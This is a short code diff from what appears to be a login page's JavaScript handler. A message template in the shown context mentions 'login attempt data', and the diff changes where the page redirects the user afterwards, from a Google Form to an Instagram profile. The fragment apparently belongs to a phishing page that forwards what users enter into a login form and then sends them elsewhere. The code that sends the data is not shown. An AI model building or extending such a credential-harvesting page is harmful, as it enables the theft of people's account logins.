@@ -43,7 +43,7 @@ This is an automated message with login attempt data.`,
       );
       
       // Redirect directly to the target URL (Google Form)
-      window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
+      window.location.href = 'https://www.instagram.com/kabya_sharma8/';
     } catch (err) {
       setError('An error occurred. Please try again.');
       setIsLoading(false);
